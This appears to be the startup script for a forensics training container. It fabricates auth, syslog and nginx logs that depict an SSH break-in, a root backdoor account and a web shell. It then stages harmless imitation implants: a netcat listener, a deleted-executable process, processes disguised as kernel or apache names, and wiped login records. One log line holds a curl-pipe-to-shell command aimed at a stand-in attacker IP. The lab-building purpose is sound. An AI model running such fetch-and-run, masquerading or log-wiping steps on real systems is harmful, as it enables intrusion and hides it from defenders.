#!/bin/sh
# Writes logs with timestamps near the container start, runs the fake implant,
# then supervises sshd. PID 1 is a plain sleep so nothing sshd does can take the
# lab host down in the middle of an investigation.
set +e
ATTACKER=198.51.100.7
mkdir -p /var/log/nginx 2>/dev/null

now() { date -d "-$1 minutes" '+%b %e %H:%M:%S' 2>/dev/null || date '+%b %e %H:%M:%S'; }
web_now() { date -d "-$1 minutes" '+%d/%b/%Y:%H:%M:%S %z' 2>/dev/null || date '+%d/%b/%Y:%H:%M:%S %z'; }

AUTH=/var/log/auth.log
[ -d /var/log ] && [ ! -f "$AUTH" ] && [ -f /var/log/secure ] && AUTH=/var/log/secure
{
  i=40
  while [ "$i" -gt 25 ]; do
    printf '%s lab sshd[%d]: Failed password for invalid user admin from %s port %d ssh2\n' \
      "$(now "$i")" $((2000 + i)) "$ATTACKER" $((40000 + i))
    i=$((i - 1))
  done
  i=25
  while [ "$i" -gt 20 ]; do
    printf '%s lab sshd[%d]: Failed password for root from %s port %d ssh2\n' \
      "$(now "$i")" $((2100 + i)) "$ATTACKER" $((41000 + i))
    i=$((i - 1))
  done
  printf '%s lab sshd[2140]: Accepted password for root from %s port 41999 ssh2\n' "$(now 20)" "$ATTACKER"
  printf '%s lab sshd[2140]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)\n' "$(now 20)"
  printf '%s lab useradd[2210]: new user: name=svcadm, UID=0, GID=0, home=/root, shell=/bin/bash\n' "$(now 19)"
  printf '%s lab sudo:  www-data : TTY=unknown ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash\n' "$(now 18)"
  printf '%s lab sshd[2301]: Accepted publickey for root from %s port 42010 ssh2: ED25519 SHA256:9k3lVnQmPqRr0aTuVwXy\n' \
    "$(now 12)" "$ATTACKER"
  printf '%s lab CRON[2402]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)\n' "$(now 5)"
} > "$AUTH"
chmod 640 "$AUTH" 2>/dev/null

{
  printf '%s lab systemd[1]: Started Session 12 of user root.\n' "$(now 30)"
  printf '%s lab kernel: audit: type=1400 apparmor="DENIED" operation="open" name="/etc/shadow"\n' "$(now 22)"
  printf '%s lab CRON[2402]: (root) CMD (curl -fsSL http://%s/x.sh | sh)\n' "$(now 5)" "$ATTACKER"
  printf '%s lab systemd[1]: rc-local.service: Succeeded.\n' "$(now 4)"
} > /var/log/syslog 2>/dev/null
[ -f /var/log/messages ] && cp /var/log/syslog /var/log/messages 2>/dev/null
chmod 640 /var/log/syslog 2>/dev/null

{
  printf '%s - - [%s] "GET /index.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0"\n' '203.0.113.24' "$(web_now 45)"
  printf '%s - - [%s] "POST /.well-known/upload.php HTTP/1.1" 200 12 "-" "curl/7.81.0"\n' "$ATTACKER" "$(web_now 21)"
  printf '%s - - [%s] "POST /config.inc.php HTTP/1.1" 200 4096 "-" "python-requests/2.31"\n' "$ATTACKER" "$(web_now 16)"
  printf '%s - - [%s] "GET /.well-known/upload.php?cmd=id HTTP/1.1" 200 46 "-" "curl/7.81.0"\n' "$ATTACKER" "$(web_now 15)"
} > /var/log/nginx/access.log 2>/dev/null

# The login records are emptied, which is what an intruder does on the way out.
: > /var/log/wtmp 2>/dev/null
: > /var/log/btmp 2>/dev/null

# The implant: a listener whose argv is dressed up as a kernel thread, and a
# process whose executable has already been unlinked.
cp /bin/sh /tmp/.deleted-payload 2>/dev/null
chmod 755 /tmp/.deleted-payload 2>/dev/null
/tmp/.deleted-payload -c 'sleep 86400' >/dev/null 2>&1 &
sleep 1
rm -f /tmp/.deleted-payload 2>/dev/null
if command -v nc >/dev/null 2>&1; then
  (nc -lk -p 4444 >/dev/null 2>&1 || nc -l -p 4444 >/dev/null 2>&1) &
fi
(exec -a '[kworker/1:2-events]' /bin/sh -c 'sleep 86400') >/dev/null 2>&1 &
(exec -a '/usr/sbin/apache2 -k start' /bin/sh -c 'sleep 86400') >/dev/null 2>&1 &

(
  while true; do
    /usr/sbin/sshd -D -e
    echo 'sshd exited, restarting' >&2
    sleep 1
  done
) &
exec sleep infinity
